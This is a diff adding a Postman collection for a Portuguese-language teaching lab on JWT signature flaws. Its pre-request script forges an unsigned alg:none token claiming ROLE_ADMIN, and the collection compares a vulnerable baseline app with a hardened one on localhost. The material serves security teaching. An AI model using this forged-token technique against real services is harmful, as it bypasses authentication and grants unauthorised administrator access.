@@ -1,0 +1,150 @@
+{
+  "info": {
+    "name": "Aula 4 — JWT (forjado × legítimo)",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+    "description": "Demonstra a falha de JWT sem verificação de assinatura.\n\nOrdem: (0) Login João, (1) JWT forjado, (2) JWT legítimo.\nApp: ./scripts/start.sh --no-docker. baseURL = http://localhost:8080.\nAbra o Console do Postman para ver o resultado de cada request."
+  },
+  "variable": [
+    {
+      "key": "baseURL",
+      "value": "http://localhost:8080"
+    },
+    {
+      "key": "tokenJoao",
+      "value": ""
+    },
+    {
+      "key": "forgedToken",
+      "value": "eyJhbGciOiJub25lIn0.eyJzdWIiOiJqb2FvQGFjbWUuY29tIiwicm9sZSI6IlJPTEVfQURNSU4ifQ."
+    }
+  ],
+  "item": [
+    {
+      "name": "0 · Login João (captura {{tokenJoao}})",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\"email\":\"joao@acme.com\",\"senha\":\"senha123\"}"
+        },
+        "url": {
+          "raw": "{{baseURL}}/api/auth/login",
+          "host": [
+            "{{baseURL}}"
+          ],
+          "path": [
+            "api",
+            "auth",
+            "login"
+          ]
+        },
+        "description": "Autentica o João e guarda o token legítimo em {{tokenJoao}}. Rode primeiro (para a 2ª requisição)."
+      },
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "type": "text/javascript",
+            "exec": [
+              "var j=pm.response.json();",
+              "if(j&&j.token){pm.collectionVariables.set('tokenJoao',j.token);}",
+              "pm.test('login 200 + token',()=>{pm.response.to.have.status(200);pm.expect(j.token).to.be.a('string');});"
+            ]
+          }
+        }
+      ],
+      "response": []
+    },
+    {
+      "name": "1 · JWT FORJADO (alg:none)  200=VULN / 401=OK",
+      "request": {
+        "method": "GET",
+        "header": [
+          {
+            "key": "Authorization",
+            "value": "Bearer {{forgedToken}}"
+          }
+        ],
+        "url": {
+          "raw": "{{baseURL}}/api/pedidos",
+          "host": [
+            "{{baseURL}}"
+          ],
+          "path": [
+            "api",
+            "pedidos"
+          ]
+        },
+        "description": "Token forjado no PRÓPRIO cliente (alg:none, role ADMIN, SEM assinatura). O pre-request gera o token em {{forgedToken}}.\n\nBASELINE: 200 (aceito!). HARDENED: 401 (assinatura verificada)."
+      },
+      "response": [],
+      "event": [
+        {
+          "listen": "prerequest",
+          "script": {
+            "type": "text/javascript",
+            "exec": [
+              "// gera o JWT forjado (alg:none, role ADMIN, SEM assinatura) dinamicamente",
+              "function b64u(s){return Buffer.from(s).toString('base64').replace(/\\+/g,'-').replace(/\\//g,'_').replace(/=+$/,'');}",
+              "var h=b64u('{\"alg\":\"none\"}');",
+              "var p=b64u('{\"sub\":\"joao@acme.com\",\"role\":\"ROLE_ADMIN\"}');",
+              "pm.collectionVariables.set('forgedToken', h + '.' + p + '.');",
+              "console.log('forgedToken =', pm.collectionVariables.get('forgedToken'));"
+            ]
+          }
+        },
+        {
+          "listen": "test",
+          "script": {
+            "type": "text/javascript",
+            "exec": [
+              "console.log('JWT forjado -> '+pm.response.code+'  (200=baseline VULN, 401=hardened OK)');",
+              "pm.test('200=baseline(VULN) ou 401=hardened(OK)',()=>pm.expect([200,401,403]).to.include(pm.response.code));"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "name": "2 · JWT LEGÍTIMO  (esperado 200)",
+      "request": {
+        "method": "GET",
+        "header": [
+          {
+            "key": "Authorization",
+            "value": "Bearer {{tokenJoao}}"
+          }
+        ],
+        "url": {
+          "raw": "{{baseURL}}/api/pedidos",
+          "host": [
+            "{{baseURL}}"
+          ],
+          "path": [
+            "api",
+            "pedidos"
+          ]
+        },
+        "description": "Token válido obtido no login (requisição 0). Deve funcionar nos dois estados (200)."
+      },
+      "response": [],
+      "event": [
+        {
+          "listen": "test",
+          "script": {
+            "type": "text/javascript",
+            "exec": [
+              "pm.test('token legítimo: 200',()=>pm.expect([200]).to.include(pm.response.code));"
+            ]
+          }
+        }
+      ]
+    }
+  ]
+}
